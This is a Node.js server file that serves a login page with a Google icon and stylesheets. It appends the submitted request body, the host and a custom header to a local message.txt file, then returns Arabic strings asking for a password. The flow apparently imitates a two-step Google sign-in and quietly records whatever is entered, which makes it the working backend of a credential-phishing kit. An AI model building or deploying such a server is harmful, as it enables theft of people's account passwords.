import http from "http";
import fs from "fs/promises";

const server = http.createServer();

server.listen(3004, "172.31.16.97", () => {
    console.log("Started Server At:", server.address());
});


server.on("request", async (request, response) => {
    if (request.method === "GET" && (request.url === "/" || request.url === "/index.html") ) {
        const fileHandle = await fs.open("../index.html", "r");
        const readStream = fileHandle.createReadStream();
        response.setHeader("content-type", "text/html; charset=utf-8");
        readStream.pipe(response);
        response.on("finish", () => {
            readStream.close();
            fileHandle.close();
        });
    };
    if ( request.method === "GET" && (request.url === "/login" || request.url === "/login.html") ) {
        const fileHandle = await fs.open("../login.html", "r");
        const readStream = fileHandle.createReadStream();
        response.setHeader("content-type", "text/html; charset=utf-8");
        readStream.pipe(response);
        response.on("finish", () => {
            readStream.close();
            fileHandle.close();
        });
    };
    if (request.method === "GET" && request.url === "/css/style.css") {
        const fileHandle = await fs.open("../css/style.css", "r");
        const readStream = fileHandle.createReadStream();
        response.setHeader("content-type", "text/css");
        readStream.pipe(response);
        response.on("finish", () => {
            readStream.close();
            fileHandle.close();
        });
    };
    if (request.method === "GET" && request.url === "/css/homestyle.css") {
        const fileHandle = await fs.open("../css/homestyle.css", "r");
        const readStream = fileHandle.createReadStream();
        response.setHeader("content-type", "text/css");
        readStream.pipe(response);
        response.on("finish", () => {
            readStream.close();
            fileHandle.close();
        });
    };
    if (request.method === "GET" && request.url === "/fonts/4UaRrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iq2vgCIhM907w.woff2") {
        const fileHandle = await fs.open("../fonts/4UaRrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iq2vgCIhM907w.woff2", "r");
        const readStream = fileHandle.createReadStream();
        response.setHeader("content-type", "font/woff2");
        readStream.pipe(response);
        response.on("finish", () => {
            readStream.close();
            fileHandle.close();
        });
    };
    if (request.method === "GET" && request.url === "/dist/script.js") {
        const fileHandle = await fs.open("../dist/script.js", "r");
        const readStream = fileHandle.createReadStream();
        response.setHeader("content-type", "text/javascript");
        readStream.pipe(response);
        response.on("finish", () => {
            readStream.close();
            fileHandle.close();
        });
    };
    if (request.method === "GET" && request.url === "/dist/behavior.js") {
        const fileHandle = await fs.open("../dist/behavior.js", "r");
        const readStream = fileHandle.createReadStream();
        response.setHeader("content-type", "text/javascript");
        readStream.pipe(response);
        response.on("finish", () => {
            readStream.close();
            fileHandle.close();
        });
    };
    if (request.method === "POST" && request.url === "/") {
        const fileHandler = await fs.open("../message/message.txt", "a");
        const writeStream = fileHandler.createWriteStream();
        writeStream.write(request.headers.host + "\r\n");
        writeStream.write(request.headers.customheader + " = ");
        request.pipe(writeStream);
        request.on("end", () => {
            writeStream.close();
            fileHandler.close();
            response.writeHead(200, "OK", { "Content-type": "application/json" });
            const changeUI = { sayHi: "مرحبًا", enterPass: "إدخال كلمة المرور", warning: "يجب إدخال كلمة مرور.", showPass: "عرض كلمة المرور", forgotPass: "هل نسيت كلمة المرور؟"};
            response.write(JSON.stringify(changeUI));
            response.end();
        });
    };
    // the icon
    if (request.method === "GET" && request.url === "/icons/google.svg") {
        const fileHandle = await fs.open("../icons/google.svg", "r");
        const readStream = fileHandle.createReadStream();
        response.setHeader("content-type", "image/svg+xml");
        readStream.pipe(response);
        response.on("finish", () => {
            readStream.close();
            fileHandle.close();
        });
    };
});

